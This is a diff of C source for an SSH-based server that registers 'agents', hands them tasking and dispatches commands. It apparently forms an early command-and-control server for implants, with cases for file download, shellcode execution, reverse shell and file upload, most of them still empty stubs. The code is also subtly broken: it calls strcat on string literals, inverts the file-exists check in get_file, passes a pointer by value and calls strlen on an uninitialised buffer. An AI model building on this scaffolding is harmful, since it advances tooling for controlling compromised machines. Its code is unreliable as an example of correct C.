@@ -333,7 +333,7 @@ int directory_exists( const char* pzPath ){
 }
 
 
-int check_if_exist(agent_id) {
+int check_if_exist(char *agent_id) {
     if(directory_exists(strcat("agents/", agent_id))){
         return 1;
     }
@@ -342,7 +342,7 @@ int check_if_exist(agent_id) {
 
 void init_agent(char *agent_id){
     FILE *fd = NULL;
-    fd = open(strcat("agents/", agent_id), "w");
+    fd = fopen(strcat("agents/", agent_id), "w");
     char data[512];
 
     /*
@@ -354,31 +354,115 @@ void init_agent(char *agent_id){
     fclose(fd);
 }
 
+int get_tasking(char *agent_id, char *tasking){
+    return 0;
+}
+
+int get_file(char *name, char *ptr){
+    int size = 0;
+    FILE *file;
+    file = fopen(name, "r");
+    if (file)
+    {
+        fclose(file);
+        return -1;
+    }
+    fseek(file, 0L, SEEK_END);
+    size = ftell(file);
+    ptr = malloc(size);
+    fread(ptr, 1, size, file);
+    fclose(file);
+
+    return size;
+
+}
+
+void agent_handler(int resp, struct clientDat agent){
+    int quitting = 0;
+    char buff[2048];
+            
+    while (!quitting)
+    {
+        switch (resp)
+        {
+        case AGENT_EXIT:
+            pthread_mutex_lock(&session_lock);
+            session_array[agent.id] = NULL;
+            pthread_mutex_unlock(&session_lock);
+            ssh_channel_close(agent.chan);
+            ssh_free(agent.session);
+            printf("Client %d: Client exiting...\n", agent.id); 
+            quitting = 1;
+            break;
+
+        case AGENT_DOWN_FILE:
+        /*ADD CHECKS IN HERE FOR SAFETY*/
+            memset(buff, 0, sizeof(buff));
+            ssh_channel_write(agent.chan, "fn", 3);
+            ssh_channel_read(agent.chan, buff, sizeof(buff), 0);
+            char *dat_ptr;
+
+            // get filesize 
+            int size = get_file(buff, dat_ptr);
+            if(size < 0){
+                printf("Client %d: filename '%s' does not exist\n", agent.id, buff); 
+                ssh_channel_write(agent.chan, "er", 3);
+                break;
+            }
+            memset(buff, 0, sizeof(buff));
+            
+            // writes file size
+            ssh_channel_write(agent.chan, &size, sizeof(size));
+            ssh_channel_read(agent.chan, buff, sizeof(buff), 0);
+
+            // writes file 
+            ssh_channel_write(agent.chan, dat_ptr, size);
+
+            // gets next tasking
+            ssh_channel_read(agent.chan, &resp, 256, 0);
+            break;
+
+        case AGENT_EXEC_SC:
+            break;
+
+        case AGENT_REV_SHELL:
+            break;
+
+        case AGENT_UP_FILE:
+            break;
+
+        default:
+            break;
+        }
+    }
+    
+    
+}
+
 
 void *ssh_handler(void* sess){
     struct clientDat pass = *(struct clientDat*) sess;
 
-    ssh_session session = pass.session;
-    int id = pass.id;
-    ssh_channel chan;
     ssh_message message;
     int sftp = 0;
     int i = 0;
     int msgType = REQ_NONE;
     char buf[4096];
+    char agent_id[128];
+    int resp;
+        
     srand(time(NULL));
     pass.trans_id = rand();
-    pass.chan = chan;
-
+    
     do {
 		//printf("entered message loop\n");
-        message=ssh_message_get(session);
+        message=ssh_message_get(pass.session);
         if(message){
             switch(ssh_message_type(message)){
                 case SSH_REQUEST_CHANNEL_OPEN:
-					printf("Client %d: Got request for opening channel\n", id); 
+					printf("Client %d: Got request for opening channel\n", pass.id); 
                     if(ssh_message_subtype(message)==SSH_CHANNEL_SESSION){
-                        chan=ssh_message_channel_request_open_reply_accept(message);
+                        pass.chan=ssh_message_channel_request_open_reply_accept(message);
                         break;
                     }
                 default:
@@ -386,21 +470,21 @@ void *ssh_handler(void* sess){
             }
             ssh_message_free(message);
         }
-    } while(message && !chan);
+    } while(message && !pass.chan);
     
-	if(!chan){
-        printf("Client %d: Channel error : %s\n", id, ssh_get_error(session));
+	if(!pass.chan){
+        printf("Client %d: Channel error : %s\n", pass.id, ssh_get_error(pass.session));
         ssh_finalize();
         return NULL;
     }
     
 	do {
 		//printf("Entered second message loop\n");
-        message=ssh_message_get(session);
+        message=ssh_message_get(pass.session);
         if(message && ssh_message_type(message)==SSH_REQUEST_CHANNEL &&
            ssh_message_subtype(message)==SSH_CHANNEL_REQUEST_SHELL){
 //            if(!strcmp(ssh_message_channel_request_subsystem(message),"sftp")){
-				printf("Client %d: Got tasking request\n", id);
+				printf("Client %d: Got tasking request\n", pass.id);
                 sftp=1;
                 msgType = REQ_TASKING;
                 ssh_message_channel_request_reply_success(message);
@@ -409,7 +493,7 @@ void *ssh_handler(void* sess){
         }
 
 		if (message && ssh_message_type(message) == SSH_REQUEST_CHANNEL && ssh_message_subtype(message) == SSH_CHANNEL_REQUEST_EXEC){
-			printf("Client %d: Got request for execution\n", id);
+			printf("Client %d: Got request for execution\n", pass.id);
             ssh_message_channel_request_reply_success(message);
             sftp=1;
             msgType = REQ_EXEC;
@@ -424,7 +508,7 @@ void *ssh_handler(void* sess){
     } while (message && !sftp);
     
 	if(!sftp){
-		printf("Client %d: SFTP error : %s\n", id, ssh_get_error(session));
+		printf("Client %d: SFTP error : %s\n", pass.id, ssh_get_error(pass.session));
         return NULL;
     }
     //printf("it works !\n");
@@ -442,48 +526,38 @@ void *ssh_handler(void* sess){
                 The client channel is then passed off to a secondary handler who will just help it complete the tasking
     
     */
-        printf("Client %d: waiting for command\n", id);
-        const char* agent_id = ssh_message_channel_request_command(message);
-        printf("Client %d: got identifier: %s\n", id, agent_id);
+        printf("Client %d: waiting for command\n", pass.id);
+        printf("Client %d: wrote data to channel\n", pass.id);
+        break;
+    case REQ_TASKING:
+        // Get agent ID
+        //char agent_id[128];
+        ssh_channel_read(pass.chan, agent_id, strlen(agent_id), 0);
+        printf("Client %d: got identifier: %s\n", pass.id, agent_id);
 
+        // Check if ID exists
         int exists = check_if_exist(agent_id);
         if(!exists){
             init_agent(agent_id);
         }
+        char tasking[2048];
+        get_tasking(agent_id, tasking);
 
-        ssh_channel_write(chan, agent_id, strlen(agent_id));
-        printf("Client %d: wrote data to channel\n", id);
+        ssh_channel_write(pass.chan, tasking, strlen(tasking));
+        ssh_channel_read(pass.chan, &resp, sizeof(resp), 0);
+
+        // Parse input
+        agent_handler(resp, pass);
+        
         break;
-    case REQ_TASKING:
-        do{
-		    i=ssh_channel_read(chan,buf, sizeof(buf), 0);
-		    if (!strncmp(buf, "exit", 4)) {
-			    printf("Caught exit from client. Doing so...\n");
-                pthread_mutex_lock(&session_lock);
-                session_array[id] = NULL;
-                pthread_mutex_unlock(&session_lock);
-                ssh_message_free(message);
-			    return NULL;
-		    }
-		
-            if(i>0) {
-                ssh_channel_write(chan, buf, i);
-			    if (write(1,buf,i) < 0) {
-                    printf("error writing to buffer\n");
-                    return NULL;
-                }
-            }
-        } while (i>0);
-        break;
-    
     default:
-        printf("Client %d: got unknown message type: %d\n", id, msgType);
+        printf("Client %d: got unknown message type: %d\n", pass.id, msgType);
         break;
     }
 
-    printf("Client %d: closing channels...\n", id);
+    printf("Client %d: closing channels...\n", pass.id);
     ssh_message_free(message);
-    ssh_disconnect(session);
+    ssh_disconnect(pass.session);
 
 	
     return NULL;
